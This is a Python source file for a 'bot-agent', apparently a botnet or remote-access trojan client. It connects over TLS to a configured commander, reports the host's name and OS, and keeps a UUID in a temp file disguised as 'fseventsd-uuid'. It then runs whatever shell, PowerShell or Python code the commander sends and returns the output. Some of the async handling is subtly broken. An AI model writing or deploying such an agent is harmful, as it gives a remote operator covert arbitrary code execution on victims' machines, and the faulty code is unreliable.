import os
import sys
import ssl
import uuid
import json
import time
import shlex
import signal
import logging.handlers
import asyncio
import tempfile
import subprocess
import configparser
from math import pow
from pathlib import Path
from platform import system
from subprocess import Popen, PIPE
from socket import socket, AF_INET, SOCK_STREAM, gethostname


def load_conf():
    config_parser = configparser.ConfigParser()
    cwd_path = Path(__file__)
    root_dir = cwd_path.parent.absolute()
    try:
        config_path = os.path.join(root_dir, "cfg/bot-agent.ini")
        config_parser.read(config_path)
        host = config_parser.get("CORE", "HOST")
        port = int(config_parser.get("CORE", "PORT"))
        max_reconn = int(config_parser.get("CORE", "MAX_RECONN"))
        idle_timeout = int(config_parser.get("CORE", "IDLE_TIMEOUT"))
        conn_buff = int((config_parser.get("CORE", "CONN_BUFF")))
        recv_tout = int((config_parser.get("CORE", "RECV_TIMEOUT")))
        hello_freq = int((config_parser.get("CORE", "HELLO_FREQ")))
        base_path = (config_parser.get("CORE", "BASE_PATH"))
        log_file = (config_parser.get("CORE", "LOG_FILE"))
        log_level = (config_parser.get("CORE", "LOG_LEVEL"))
    except Exception as err:
        print(f"Error initializing CORE, bot agent not started because config file could not be loaded. Unexpected "
              f"exception occurred: {err}")
        exit(5)
    return host, port, max_reconn, conn_buff, idle_timeout, recv_tout, hello_freq, base_path, log_file, log_level

def create_bot_agent_logger(base_path, log_file, log_level):
    formatter = logging.Formatter(fmt='%(asctime)s - %(levelname)s - %(name)s:: - %(message)s', datefmt="%Y-%m-%d %H:%M:%S")
    handlers = [
        logging.handlers.RotatingFileHandler(f"{base_path}/{log_file}", encoding="utf8", maxBytes=100000, backupCount=1),
        logging.StreamHandler()
    ]
    logger = logging.getLogger()
    logger.setLevel(log_level)
    for h in handlers:
        h.setFormatter(formatter)
        h.setLevel(logging.DEBUG)
        logger.addHandler(h)

class BotAgent:
    def __init__(self, host, port, max_reconn, idle_timeout, conn_buff, recv_tout, hello_freq, base_path, log_file,
                 log_level):
        self.base_path=base_path
        self.log_file=log_file
        self.log_level=log_level
        self.logger = logging.getLogger(__name__+"."+self.__class__.__name__)
        self.__config_logger()
        self.host = host
        self.port = port
        self.hostname = gethostname()
        self.os = self.__os_type()
        self.max_reconn = max_reconn
        self.idle = False
        self.recv_tout = recv_tout
        self.idle_tout = idle_timeout
        self.conn_buff = conn_buff
        self.hello_freq = hello_freq
        self.sock = socket(AF_INET, SOCK_STREAM)
        self.context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
        self.reconnect_count = 0

    def __config_logger(self):
        formatter = logging.Formatter(fmt='%(asctime)s - %(levelname)s - %(name)s:: - %(message)s',
                                      datefmt="%Y-%m-%d %H:%M:%S")
        handlers = [
            logging.handlers.RotatingFileHandler(f"{self.base_path}/{self.log_file}", encoding="utf8",
                                                 maxBytes=100000, backupCount=1),
            logging.StreamHandler()
        ]
        self.logger.setLevel(self.log_level)
        for h in handlers:
            h.setFormatter(formatter)
            h.setLevel(logging.DEBUG)
            self.logger.addHandler(h)

    async def run(self):
        self.__check_uuid()
        await self.__self_identify()

    @staticmethod
    def __os_type():
        op_sys = system()
        if op_sys:
            return op_sys
        else:
            print("Error, operating system type could not be determined, this info will be missing from commander")

    def __check_uuid(self):
        self.uid_path = os.path.join(tempfile.gettempdir(), "fseventsd-uuid")
        if os.path.isfile(self.uid_path):
            with open(self.uid_path, 'r') as fh:
                self.uuid = fh.read()
        else:
            self.uuid = self.__gen_uuid()

    def __gen_uuid(self):
        new_uuid = str(uuid.uuid4())
        with open(self.uid_path, 'w') as fh:
            fh.write(new_uuid)
        return new_uuid

    async def __tcp_handshake(self):
        try:
            self.sock.close()
            self.sock = socket(AF_INET, SOCK_STREAM)
            self.sock.connect((self.host, self.port))
        except Exception as err:
            self.logger.error(f"Unexpected error occurred when connecting to commander: {err}")
            self.sock.close()
            await self.__reconnect()
        self.logger.info(f"TCP connection established with commander {self.host}:{self.port}")
        self.reconnect_count = 0
    
    async def __tls_handshake(self):
        self.logger.debug(f"Performing TLS handshake with peer {self.host}:{self.port}")
        try:
            self.ssl_sock = self.context.wrap_socket(self.sock)
            self.last_online = time.time()
        except Exception as err:
            self.logger.error(f"Unexpected exception occurred when performing handshake with peer {self.host}:{self.port} - {err}")
            self.logger.info(f"Closing connection with peer {self.host}:{self.port}")
            self.ssl_sock.close()
            self.__tcp_handshake()

    async def __reconnect(self):
        if self.reconnect_count < self.max_reconn:
            self.reconnect_count += 1
        time.sleep(pow(2, self.reconnect_count))
        self.sock = socket(AF_INET, SOCK_STREAM)
        await self.__tcp_handshake()

    async def __self_identify(self):
        await self.__tcp_handshake()
        await self.__tls_handshake()
        self.ssl_sock.settimeout(self.recv_tout)
        if await self.__send_agent_info():
            self.logger.info(f"Bot-agent {self.hostname}-{self.uuid} has been successfully added by commander")
            await self.__check_for_commands()
        else:
            if self.reconnect_count < self.max_reconn:
                self.reconnect_count += 1
            time.sleep(pow(2, self.reconnect_count))
            await self.__self_identify()

    async def __send_agent_info(self):
        payload = self.__build_json_payload("botHostInfo")
        if not payload:
            await self.__self_identify()
        try:
            self.logger.debug(f"Sending botHostInfo from bot-agent {self.hostname} to commander")
            self.ssl_sock.sendall(payload)
        except Exception as err:
            self.logger.error(f"Unexpected error occurred while sending botHostInfo of peer {self.hostname} to commander: {err}")
            return
        try:
            data = self.ssl_sock.recv(self.conn_buff)
        except Exception as err:
            self.logger.error(f"Unexpected error occurred while reading botHostInfoReply by peer {self.hostname}: {err}")
            return
        if data:
            if await self.__process_input_stream(data):
                return True
            else:
                return
        else:
            self.logger.warning(f"Received EOF from commander instead of botHostInfoReply")
            return

    async def __process_input_stream(self, data):
        json_msg = self.__json_deserialize(data)
        if not isinstance(json_msg, dict):
            return
        msg = json_msg.get("message")
        if msg in ["botHostInfoReply", "botHelloReply"]:
            self.logger.debug(f"Bot-agent {self.hostname} received {msg} from commander")
            self.last_online = time.time()
        elif msg == "exeCommand":
            cmd = json_msg.get("command")
            timeout = json_msg.get("timeout")
            cmd_id = json_msg.get("cmd_id")
            self.logger.debug(f"Bot-agent {self.hostname} received {msg} - {cmd} from commander")
            response, exit_code = await self.__execute_command(msg, timeout, cmd)
            if response:
                payload = self.__build_json_payload("exeCommandReply", cmd, cmd_id, response, exit_code)
                if not payload or not self.__send_command(payload, json_msg):
                    return
            else:
                return
        elif msg == "exeScript":
            script = json_msg.get("script")
            script_type = json_msg.get("type")
            timeout = json_msg.get("timeout")
            cmd_id = json_msg.get("cmd_id")
            script_data = json_msg.get("command")
            self.logger.debug(f"Bot-agent {self.hostname} received {msg} - {script_type}")
            response, exit_code = await self.__execute_command(msg, timeout, script_type, script_data)
            if response:
                payload = self.__build_json_payload("exeScriptReply", script, cmd_id, response, exit_code)
                if not payload or not self.__send_command(payload, json_msg):
                    return
            else:
                return
        else:
            self.logger.warning(f"Bot-agent {self.hostname} received an unknown message from commander: {msg}")
            return
        return True

    def __json_deserialize(self, data):
        try:
            return json.loads(data.decode("utf-8"))
        except Exception as err:
            self.logger.error(f"Unexpected exception when deserializing message from commander: {err}")

    def __build_json_payload(self, msg, *args):
        match msg:
            case "botHostInfo":
                d = {"message": msg, "uuid": self.uuid, "hostname": self.hostname, "os": self.os}
            case "botHello":
                d = {"message": msg}
            case "exeCommandReply":
                request, cmd_id, response, exit_code = args
                d = {"message": msg, "command": request, "cmd_id": cmd_id, "result": response, "exit_code": exit_code}
            case "exeScriptReply":
                s_path, cmd_id, response, exit_code = args
                d = {"message": msg, "command": s_path, "cmd_id": cmd_id, "result": response, "exit_code": exit_code}
            case _:
                self.logger.error("Internal error, json payload to build didn't match any supported message type")
                return
        try:
            payload = (json.dumps(d) + "\n").encode("utf-8")
        except Exception as err:
            self.logger.error(f"Unexpected error when serializing {msg} json: {err}. Reconnecting to commander.")
            return
        return payload

    async def __check_for_commands(self):
        while True:
            data = ""
            if time.time() - self.last_online > self.idle_tout:
                if await self.__keep_alive():
                    await asyncio.sleep(self.hello_freq)
                    continue
                else:
                    await self.__self_identify()
            try:
                data = await self.__read_buffer()
            except Exception as err:
                self.logger.error(f"Unexpected error on bot-agent {self.hostname} when reading input stream from"
                                  f" commander, error: {err}")
                await self.__self_identify()
            if data:
                for json_item in data:
                    result = await self.__process_input_stream(json_item)
                    if result:
                        continue
                    else:
                        await self.__self_identify()
            else:
                await asyncio.sleep(self.hello_freq)

    async def __execute_command(self, cmd_type, timeout, *args):
        popen_payload = []
        command = ""
        if cmd_type == "exeCommand":
            data, = args
            try:
                popen_payload = shlex.split(data)
                command = popen_payload[0]
            except Exception as err:
                self.logger.error(f"Unexpected exception when splitting command received from commander by bot-agent"
                                  f" {self.hostname}. Will not process it and just move on. Error: {err}")
                return False, False
        elif cmd_type == "exeScript":
            command, script_data = args
            d = {
                "powershell": [command, '-Command', script_data],
                "sh"        : [command, '-c', script_data],
                "python"    : [command, '-c', script_data]
            }
            popen_payload = d.get(command)
        if not self.__which(command):
            msg = (f"The command {command} that commander has sent to bot-agent {self.hostname} is unknown. Will not"
                   f" process it and just move on.")
            print(msg)
            return msg, False
        p = Popen(popen_payload, stderr=PIPE, stdout=PIPE)
        try:
            loop =asyncio.get_running_loop()
            out, err = await loop.run_in_executor(None, self.__run_process, p, timeout)
        except subprocess.TimeoutExpired:
            p.kill()
            response = f"TimeoutExpired ({timeout} seconds) from bot-agent {self.hostname} for command {popen_payload}"
            return response, p.returncode
        if out and err:
            response = f"Output: {out}, Error: {err}"
        elif out:
            response = out
        elif err:
            response = err
        else:
            response = f"Empty response from bot-agent {self.hostname} for command {popen_payload}"
        return str(response), p.returncode

    @staticmethod
    def __run_process(process, timeout):
        return process.communicate(timeout=timeout)

    def __send_command(self, payload, json_msg):
        try:
            self.logger.debug(f"Sending {payload.decode('utf-8')} from bot-agent {self.hostname}:{self.ssl_sock.getsockname()}")
            self.ssl_sock.sendall(payload)
            self.last_online = time.time()
            return True
        except Exception as err:
            self.logger.error(f"Unexpected exception for bot-agent {self.hostname} when replying to command {json_msg}: {err}")
            return

    @staticmethod
    def __which(executable):
        def is_exe(f_path):
            return os.path.isfile(f_path) and os.access(f_path, os.X_OK)

        f_path, f_name = os.path.split(executable)
        if f_path:
            if is_exe(executable):
                return executable
        else:
            for path in os.environ["PATH"].split(os.pathsep):
                exe_file = os.path.join(path, executable)
                if is_exe(exe_file):
                    return exe_file

    async def __keep_alive(self):
        payload = self.__build_json_payload("botHello")
        if payload:
            try:
                self.logger.debug("Sending botHello to Commander to maintain keepalive")
                self.ssl_sock.sendall(payload)
                self.last_online = time.time()
            except Exception as err:
                self.logger.error("Unexpected exception occurred for bot-agent {} when sending botHello to commander: {}".
                      format(self.hostname, err))
                return
        else:
            self.logger.info(f"Reconnecting to bot commander {self.host}:{self.port}")
            return
        return True

    async def __read_buffer(self):
        buffer = self.__read_initial()
        if not buffer:
            self.logger.debug(f"Buffer of bot-agent {self.hostname} is empty")
            return False
        buffering = True
        data_list = []
        while buffering:
            if b"\n" in buffer:
                (line, buffer) = buffer.split(b"\n", 1)
                data_list.append(line)
                return data_list
            else:
                more_data = await self.ssl_sock.recv(self.conn_buff)
                if not more_data:
                    buffering = False
                else:
                    buffer += more_data
        return data_list

    def __read_initial(self):
        self.ssl_sock.settimeout(self.recv_tout)
        try:
            buffer = self.ssl_sock.recv(self.conn_buff)
        except TimeoutError:
            self.logger.warning("Timeout of {} seconds exceeded. Bot-agent {} has not received input stream from commander".
                  format(self.recv_tout, self.hostname))
            return False
        except Exception as err:
            self.logger.error("Unexpected error on bot-agent {} when reading input stream from commander, error: {}".
                  format(self.hostname, err))
            return False
        return buffer

    async def shutdown(self, s):
        self.logger.info(f"Received exit signal {s.name}...")
        self.logger.info("Bot-Agent is shutting down")
        loop.stop()

if __name__ == "__main__":
    HOST, PORT, MAX_RECONN, CONN_BUFF, IDLE_TIMEOUT, RECV_TOUT, HELLO_FREQ, BASE_PATH, LOG_FILE, LOG_LEVEL = load_conf()
    bot_agent = BotAgent(HOST, PORT, MAX_RECONN, IDLE_TIMEOUT, CONN_BUFF, RECV_TOUT, HELLO_FREQ, BASE_PATH, LOG_FILE,
                         LOG_LEVEL)
    loop = asyncio.new_event_loop()
    signals = (signal.SIGTERM, signal.SIGINT)
    for s in signals:
        loop.add_signal_handler(
            s, lambda sig=s: asyncio.create_task(bot_agent.shutdown(s)))
    try:
        loop.create_task(bot_agent.run())
        loop.run_forever()
    finally:
        loop.close()
